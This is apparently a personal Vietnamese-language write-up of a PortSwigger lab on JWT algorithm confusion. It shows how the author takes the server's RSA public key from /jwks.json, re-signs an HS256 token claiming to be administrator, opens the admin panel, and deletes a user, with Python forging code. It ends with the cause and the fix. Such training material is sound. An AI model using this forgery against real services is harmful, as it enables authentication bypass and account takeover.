![[jwt-confusion.png]]
-mô tả lab: server ký RS256 (có public/private key) nhưng verify ẩu theo `alg` trong header. Mình đổi sang HS256 rồi ký bằng chính public key của server.

> [!NOTE]
> -test bằng `wiener:peter`. Lab: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-algorithm-confusion

### hướng giải
- [ ] mình login rồi decode JWT, mình thấy header `{"alg":"RS256","kid":"...","typ":"JWT"}`, payload `sub=wiener`
- [ ] mình GET `/jwks.json`, sau đó quan sát gói tin này, mình thấy server public luôn RSA public key (n, e)
- [ ] mình thử đổi `alg` thành `HS256` + ký bừa 1 secret, mình thấy fail -> server có check chữ ký, nhưng nó lấy key nào để check HS256?
- [ ] => mình đoán nó lấy public key RSA làm HMAC secret (lỗi kinh điển). Vì public key ai cũng đọc được nên mình ký được token xịn

### giải
-bước 1: mình lấy public key:
```
GET /jwks.json -> 200
{"keys":[{"kty":"RSA","kid":"...","n":"0vx7ago...","e":"AQAB", ...}]}
```
-mình convert sang PEM. JWT Editor Keys làm hộ: copy JWK vào, hoặc dùng python:
```python
from jwt.algorithms import RSAAlgorithm
import json
jwk = json.load(open("jwks.json"))["keys"][0]
pub = RSAAlgorithm.from_jwk(json.dumps(jwk))
pem = pub.public_bytes(...)  # hoặc để JWT Editor tự xử
```

-bước 2: mình tạo token mới trong JWT Editor:
- header: `{"alg":"HS256","kid":"<kid-goc>"}`
- payload: `{"iss":"portswigger","sub":"administrator","exp":9999999999}`
- sign HS256 với "secret" = nội dung public key PEM vừa lấy.
![[jwt-confusion-sign.png]]
-sau khi quan sát gói tin trả về này, mình thấy server thấy `alg=HS256` liền lấy public key ra verify HMAC -> khớp -> tin mình là admin.

-bước 3: thay cookie, GET `/admin` -> 200, xóa carlos là solve.

-cách python gọn của mình:
```python
import jwt
public_pem = open("public.pem").read()  # lấy từ /jwks.json convert ra
token = jwt.encode({"iss":"portswigger","sub":"administrator","exp":9999999999},
                   public_pem, algorithm="HS256", headers={"kid":"KID_GOC"})
```

> [!NOTE]
> -vì sao dính: code verify đọc `alg` từ token rồi mới chọn key, thay vì ép đúng RS256 + verify bằng public key theo nghĩa RSA. Fix là whitelist `algorithms=["RS256"]` cứng.
> -bài học của mình: thấy `RS256` + có `/jwks.json` public là mình nghĩ ngay tới confusion.
